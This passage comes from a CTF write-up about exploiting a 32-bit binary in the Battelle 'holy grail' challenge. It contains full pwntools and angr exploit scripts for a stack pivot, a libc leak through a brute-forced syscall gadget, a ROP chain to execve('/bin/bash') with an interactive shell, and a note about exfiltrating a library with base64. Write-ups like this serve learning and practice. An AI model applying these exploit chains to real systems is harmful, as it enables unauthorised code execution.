</span><span>        pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(exe</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;read&#39;</span><span>])
</span><span>
</span><span>        log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;pivot chain created&quot;</span><span>)
</span><span>
</span><span>        pivot_payload </span><span style="color:#f29e74;">+= </span><span>pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">chain</span><span>()
</span><span>
</span><span>        rop </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(exe)
</span><span>        rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span>bss</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">len</span><span>(pivot_payload))
</span><span>        rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(</span><span style="color:#ffcc66;">0x08048485</span><span>)
</span><span>
</span><span>        raw_rop </span><span style="color:#f29e74;">= </span><span>rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">chain</span><span>()
</span><span>        log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;original chain created&quot;</span><span>)
</span><span>
</span><span>
</span><span>        </span><span style="color:#ffa759;">with </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;payload.bin&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;rb&quot;</span><span>) </span><span style="color:#ffa759;">as </span><span>f:
</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>() </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p32</span><span>(chain_start</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">4</span><span>) </span><span style="color:#f29e74;">+ </span><span>raw_rop)
</span><span>            time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(pivot_payload)
</span><span>            time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>            r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(syscall_gadget)
</span><span>        received </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>()
</span><span>        </span><span style="color:#ffa759;">with </span><span>file_semaphore:
</span><span>            </span><span style="color:#ffa759;">with </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;brute.log&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;a&quot;</span><span>) </span><span style="color:#ffa759;">as </span><span>f:
</span><span>                f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span>{syscall_gadget_no}</span><span style="color:#bae67e;"> -&gt; </span><span>{received}</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>        </span><span style="color:#ffa759;">with </span><span>semaphore:
</span><span>            </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;finishing </span><span>{syscall_gadget_no}</span><span style="color:#bae67e;"> - </span><span>{received}</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>        </span><span style="color:#ffa759;">return </span><span>(syscall_gadget_no</span><span style="color:#ccc9c2cc;">, </span><span>received)
</span><span>    </span><span style="color:#ffa759;">except</span><span>:
</span><span>        </span><span style="color:#ffd580;">try_byte</span><span>(syscall_gadget_no)
</span><span>
</span><span style="color:#ffa759;">from </span><span>multiprocessing </span><span style="color:#ffa759;">import </span><span>Pool
</span><span>
</span><span>pool </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Pool</span><span>(</span><span style="color:#ffcc66;">4</span><span>)
</span><span>
</span><span style="color:#ffa759;">with </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;result.log&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;w&quot;</span><span>) </span><span style="color:#ffa759;">as </span><span>f:
</span><span>    </span><span style="color:#ffa759;">for </span><span>(a</span><span style="color:#ccc9c2cc;">,</span><span>b) </span><span style="color:#ffa759;">in </span><span>pool</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">map</span><span>(try_byte</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">256</span><span>)):
</span><span>        f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span>{syscall_gadget_no}</span><span style="color:#bae67e;"> -&gt; </span><span>{received}</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
</span></code></pre>
<p>This turned out to work fine (although it was quite close to the end, I was getting a little scared) and I discovered that 244 (0xf4) was the correct byte to overwrite with to construct a syscall gadget.</p>
<pre style="background-color:#212733;color:#ccc9c2;"><code><span>230 -&gt; b&quot;\nSHE&#39;S A WITCH BURN HER!\n&quot;
</span><span>244 -&gt; b&quot;\nPSHE&#39;S A WITCH BURN HER!\n&quot;
</span><span>245 -&gt; b&quot;\nSHE&#39;S A WITCH BURN HER!\n&quot;
</span></code></pre>
<p>Once I discovered how to leak a single byte, I leaked individual bytes of the GOT by varying the number of INC ECX gadgets to determine the lower 12 bits of __libc_start_main (0xa50) and setvbuf (0x700). I then used <a href="https://libc.rip/">libc.rip</a> to determine that the libc version on remote was libc6-i386_2.28-10_amd64.</p>
<h2 id="getting-a-shell">getting a shell!</h2>
<p>At this point I had all the building blocks necessary to get a shell, I just needed to refine and put it together. The key difference between my earlier rop chain and the chain I used to get a shell was the size of my information leak. I lacked any gadgets to control edx directly, so I was left to rely on whatever had previously set it -- in this case the read call I used to turn read into a syscall gadget. Naively, this left 1 in edx because I was overwriting a single byte.  I realized I could take advantage of the fact that read length is a <em>maximum</em> and it will happily read fewer bytes if that is all that is present. I adjusted it to read 4 bytes (a full word leak) and then dropped a time.sleep after sending only a single byte to force read to return early.</p>
<p>Putting this into action got me a total ASLR leak, allowing me to return to libc with 100% success (more or less, I got the odd connection error)</p>
<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
</span><span style="color:#ffa759;">import </span><span>time</span><span style="color:#ccc9c2cc;">, </span><span>angr</span><span style="color:#ccc9c2cc;">, </span><span>logging
</span><span>
</span><span>logging</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getLogger</span><span>(</span><span style="color:#bae67e;">&#39;angr&#39;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">setLevel</span><span>(</span><span style="color:#bae67e;">&#39;ERROR&#39;</span><span>)
</span><span>logging</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getLogger</span><span>(</span><span style="color:#bae67e;">&#39;claripy&#39;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">setLevel</span><span>(</span><span style="color:#bae67e;">&#39;ERROR&#39;</span><span>)
</span><span>
</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&#39;kitty&#39;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&#39;-e&#39;</span><span>]
</span><span>
</span><span>r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;ctf.battelle.org&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">30042</span><span>)
</span><span>
</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;********************************&quot;</span><span>)
</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
</span><span style="color:#ffa759;">with </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;current_binary&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;wb&quot;</span><span>) </span><span style="color:#ffa759;">as </span><span>f:
</span><span>    f</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;********************************</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>))
</span><span>
</span><span>
</span><span>p </span><span style="color:#f29e74;">= </span><span>angr</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">Project</span><span>(</span><span style="color:#bae67e;">&quot;current_binary&quot;</span><span>)
</span><span>state </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span>factory</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">blank_state</span><span>()
</span><span>
</span><span>simgr </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span>factory</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">simgr</span><span>(state</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">save_unconstrained</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>)
</span><span>simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;mem_corrupt&#39;</span><span>]  </span><span style="color:#f29e74;">= </span><span>[]
</span><span>
</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">check_mem_corruption</span><span>(</span><span style="color:#ffcc66;">simgr</span><span>):
</span><span>    </span><span style="color:#ffa759;">if </span><span style="color:#f28779;">len</span><span>(simgr</span><span style="color:#f29e74;">.</span><span>unconstrained):
</span><span>        </span><span style="color:#ffa759;">for </span><span>path </span><span style="color:#ffa759;">in </span><span>simgr</span><span style="color:#f29e74;">.</span><span>unconstrained:
</span><span>            </span><span style="color:#ffa759;">if </span><span>path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">satisfiable</span><span>(</span><span style="color:#ffcc66;">extra_constraints</span><span style="color:#f29e74;">=</span><span>[path</span><span style="color:#f29e74;">.</span><span>regs</span><span style="color:#f29e74;">.</span><span>pc </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;ABCD&quot;</span><span>]):
</span><span>                path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">add_constraints</span><span>(path</span><span style="color:#f29e74;">.</span><span>regs</span><span style="color:#f29e74;">.</span><span>pc </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;ABCD&quot;</span><span>)
</span><span>                </span><span style="color:#ffa759;">if </span><span>path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">satisfiable</span><span>():
</span><span>                    simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;mem_corrupt&#39;</span><span>]</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">append</span><span>(path)
</span><span>                simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;unconstrained&#39;</span><span>]</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">remove</span><span>(path)
</span><span>                simgr</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">drop</span><span>(</span><span style="color:#ffcc66;">stash</span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&#39;active&#39;</span><span>)
</span><span>    </span><span style="color:#ffa759;">return </span><span>simgr
</span><span>
</span><span>simgr</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">explore</span><span>(</span><span style="color:#ffcc66;">step_func</span><span style="color:#f29e74;">=</span><span>check_mem_corruption)
</span><span style="color:#ffa759;">if </span><span style="color:#f28779;">len</span><span>(simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;mem_corrupt&#39;</span><span>]) </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>:
</span><span>    log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">warn</span><span>(</span><span style="color:#bae67e;">&quot;could not find memory corrupting input&quot;</span><span>)
</span><span>    </span><span style="color:#ffd580;">exit</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>corrupting </span><span style="color:#f29e74;">= </span><span>simgr</span><span style="color:#f29e74;">.</span><span>stashes[</span><span style="color:#bae67e;">&#39;mem_corrupt&#39;</span><span>][</span><span style="color:#ffcc66;">0</span><span>]</span><span style="color:#f29e74;">.</span><span>posix</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>(</span><span style="color:#ffcc66;">0</span><span>)
</span><span>payload </span><span style="color:#f29e74;">= </span><span>corrupting[</span><span style="color:#ccc9c2cc;">:</span><span>corrupting</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">index</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;DCBA&quot;</span><span>)</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">4</span><span>]
</span><span>
</span><span>pivoted_stack_1 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x0804b068 </span><span style="font-style:italic;color:#5c6773;"># start of bss + enough to not clobber important stuff
</span><span>
</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./current_binary&quot;</span><span>)
</span><span>
</span><span>
</span><span>POP_EBX_RET </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x08048371
</span><span>POP_EBX_RET </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x08048371
</span><span>MOV_AX_4 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x080484f7
</span><span style="font-style:italic;color:#5c6773;">## above gadgets are constant
</span><span>POP_EBP_RET </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">next</span><span>(exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x5d\xc3</span><span style="color:#bae67e;">&quot;</span><span>))
</span><span>INC_ECX_RET </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">next</span><span>(exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x41\xc3</span><span style="color:#bae67e;">&quot;</span><span>))
</span><span>LEAVE_RET </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">next</span><span>(exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\xc9\xc3</span><span style="color:#bae67e;">&quot;</span><span>))
</span><span>RET </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">next</span><span>(exe</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\xc3</span><span style="color:#bae67e;">&quot;</span><span>))
</span><span>
</span><span style="font-style:italic;color:#5c6773;">## the first thing we want to do is pivot the stack
</span><span style="font-style:italic;color:#5c6773;">## we&#39;re gonna have to commit some sins to get this to work and limited rop chain size isn&#39;t gonna do it
</span><span>pivot_payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;&quot;
</span><span>pivot_payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p32</span><span>(</span><span style="color:#ffcc66;">0x0804b09c</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">4</span><span>)
</span><span>
</span><span>pivot_chain </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(exe)
</span><span style="font-style:italic;color:#5c6773;">## step 1 is to overwrite the last byte of the read pointer
</span><span style="font-style:italic;color:#5c6773;">## I used length to leave 4 in edx for a later write because read can receive fewer than len bytes
</span><span>pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span>exe</span><span style="color:#f29e74;">.</span><span>got[</span><span style="color:#bae67e;">&#39;read&#39;</span><span>]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">4</span><span>)
</span><span style="font-style:italic;color:#5c6773;">## Step 2 is to write a pointer out of the GOT, allowing me to break ASLR and determine the version of libc on the server
</span><span style="font-style:italic;color:#5c6773;">## ebx/file descriptor can be set by pop ebx gadget but we need to be more inventive for other arguments
</span><span>pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(pivot_chain</span><span style="color:#f29e74;">.</span><span>ebx[</span><span style="color:#ffcc66;">0</span><span>])
</span><span>pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span style="font-style:italic;color:#5c6773;">## ecx is already the GOT entry of read because we read over the entry
</span><span style="font-style:italic;color:#5c6773;">## we lack any easy pointers to control ECX but we can increment it four times to switch to the next entry in the GOT
</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">4</span><span>):
</span><span>    pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(INC_ECX_RET)
</span><span style="font-style:italic;color:#5c6773;">## to write with a syscall gadget we need eax == 4
</span><span style="font-style:italic;color:#5c6773;">## the only gadget I could find to do so is mov al, 4; or byte ptr [ecx], al; leave; ret; 
</span><span style="font-style:italic;color:#5c6773;">## ecx at this point is the GOT entry to strlen which we can comfortably clobber because it is no longer needed
</span><span>pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(MOV_AX_4)
</span><span style="font-style:italic;color:#5c6773;">## we then increment ECX again to leak __libc_start_main
</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">4</span><span>):
</span><span>    pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(INC_ECX_RET)
</span><span style="font-style:italic;color:#5c6773;">## and lastly we call &quot;read&quot; which is actually a syscall gadget
</span><span>pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(exe</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;read&#39;</span><span>])
</span><span>
</span><span style="font-style:italic;color:#5c6773;">## to finish out this rop chain we need to set up for the next stage of this exploit
</span><span style="font-style:italic;color:#5c6773;">## we will need to construct another rop chain with our new knowledge of libc base
</span><span style="font-style:italic;color:#5c6773;">## 7 null words are garbage values which are consumed between read&#39;s syscall and ret
</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">7</span><span>):
</span><span>    pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(</span><span style="color:#ffcc66;">0</span><span>)
</span><span style="font-style:italic;color:#5c6773;">## these ret gadgets make the stack pointer far enough from the base that calling into the dynamic linker will not segfault
</span><span style="font-style:italic;color:#5c6773;">## i ran into issues with it segfaulting because it hit the base of bss
</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">100</span><span>):
</span><span>    pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(RET)
</span><span style="font-style:italic;color:#5c6773;">## and lastly we use the plt stub to convince the dynamic linker into retrieving the original read pointer
</span><span style="font-style:italic;color:#5c6773;">## allowing us to read again and inject a second rop chain
</span><span style="font-style:italic;color:#5c6773;">## we&#39;re reading 11 * 4 bytes (size of the second pivot stack) into a location in the bss slightly after our previous rop chain ends
</span><span>pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">call</span><span>(</span><span style="color:#ffcc66;">0x8048396</span><span style="color:#ccc9c2cc;">, </span><span>[</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0x0804b260</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">11 </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">4</span><span>])
</span><span>log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;pivot chain created&quot;</span><span>)
</span><span>log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dump</span><span>())
</span><span>
</span><span>pivot_payload </span><span style="color:#f29e74;">+= </span><span>pivot_chain</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">chain</span><span>()
</span><span>pivot_payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p32</span><span>(pivoted_stack_1 </span><span style="color:#f29e74;">+ </span><span style="color:#f28779;">len</span><span>(pivot_payload) </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">4</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;/bin/bash&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ljust</span><span>(</span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\x00</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>
</span><span>rop </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(exe)
</span><span>rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span>pivoted_stack_1</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">len</span><span>(pivot_payload))
</span><span>rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">raw</span><span>(LEAVE_RET)
</span><span style="font-style:italic;color:#5c6773;">## we override the stored ebp with pivoted_stack_1 so this will copy ebp, esp and adjust the stack to the new location
</span><span style="font-style:italic;color:#5c6773;">## we previously read an arbitrarily large rop chain to that area
</span><span>log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;first chain created&quot;</span><span>)
</span><span>log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dump</span><span>())
</span><span>
</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(payload </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p32</span><span>(pivoted_stack_1) </span><span style="color:#f29e74;">+ </span><span>rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">chain</span><span>())
</span><span>time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(pivot_payload)
</span><span>time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(</span><span style="color:#ffd580;">p8</span><span>(</span><span style="color:#ffcc66;">244</span><span>))
</span><span>time</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sleep</span><span>(</span><span style="color:#ffcc66;">1</span><span>)
</span><span>
</span><span>
</span><span>libc_base </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">u32</span><span>(r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recv</span><span>(</span><span style="color:#ffcc66;">4</span><span>)) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x0001aa50 </span><span style="font-style:italic;color:#5c6773;"># offset of __libc_start_main
</span><span>
</span><span>log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;leaked libc_base @ </span><span>{</span><span style="color:#f28779;">hex</span><span>(libc_base)}</span><span style="color:#bae67e;">&quot;</span><span>)
</span><span>
</span><span>
</span><span>execve </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x000c0470
</span><span>mprotect </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x000f5940
</span><span>read </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x000e7ea0
</span><span>
</span><span style="font-style:italic;color:#5c6773;">## the second rop chain is created with knowledge of libc base
</span><span style="font-style:italic;color:#5c6773;">## so no need to do anything tricky with read
</span><span>pivot_chain_2 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(exe)
</span><span>pivot_chain_2</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">call</span><span>(execve</span><span style="color:#ccc9c2cc;">, </span><span>[</span><span style="color:#ffcc66;">0x0804b274</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>]) </span><span style="font-style:italic;color:#5c6773;"># location of /bin/bash in bss
</span><span>log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(</span><span style="color:#bae67e;">&quot;created second pivot chain&quot;</span><span>)
</span><span>log</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">info</span><span>(pivot_chain_2</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dump</span><span>())
</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(pivot_chain_2</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">chain</span><span>())
</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(</span><span style="color:#bae67e;">&quot;whoami&quot;</span><span>)
</span><span>
</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
</span></code></pre>
<p>As some careful enumeration of the box showed (very careful because I got about 10 seconds before the timeout kicked me) it was missing several important binaries (/bin/sh, cat, etc). It did, luckily, have ls which showed me the contents of the working directory.</p>
<pre style="background-color:#212733;color:#ccc9c2;"><code><span>bin
</span><span>dev
</span><span>exec_8c24169a11a765ad7302322dc13b8917.bin
</span><span>hint.txt
</span><span>lib
</span><span>lib32
</span><span>lib64
</span><span>log
</span><span>usr
</span></code></pre>
<p>The most interesting one is hint.txt -- I had assumed that getting a shell wouldn't be sufficient because there are mentions of having to exploit multiple binaries and calling the symbol "holy_grail" which did not exist in the binary. The text of this hint tells us that it is linked with "libgrail.so" using LD_PRELOAD.</p>
<pre style="background-color:#212733;color:#ccc9c2;"><code><span>Congrats! You we&#39;re supposed to find this!
</span><span>
</span><span>Here&#39;s your hint
</span><span>
</span><span>Your binary was invoked like this
</span><span>
</span><span>LD_PRELOAD=/lib32/libgrail.so ./bin
</span></code></pre>
<p>This likely contains the aforementioned "holy_grail" symbol which needs to be called to win. I exfiltrated it with base64 (love that binary, dropping static binaries on boxes you really aren't supposed to have them with base64 is a quality strat) and found the following function.</p>
<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">holy_grail</span><span>(</span><span style="color:#ffa759;">void</span><span>)
</span><span>
</span><span>{
</span><span>  </span><span style="color:#ffa759;">int</span><span> __fd</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="font-style:italic;color:#5ccfe6;">size_t</span><span> __n</span><span style="color:#ccc9c2cc;">;
</span><span>  
</span><span>  __fd </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">open</span><span>(</span><span style="color:#bae67e;">&quot;./log&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#ccc9c2cc;">;
</span><span>  __n </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strlen</span><span>(</span><span style="color:#bae67e;">&quot;DONE</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
</span><span>  </span><span style="color:#ffd580;">write</span><span>(__fd</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;DONE</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>__n)</span><span style="color:#ccc9c2cc;">;
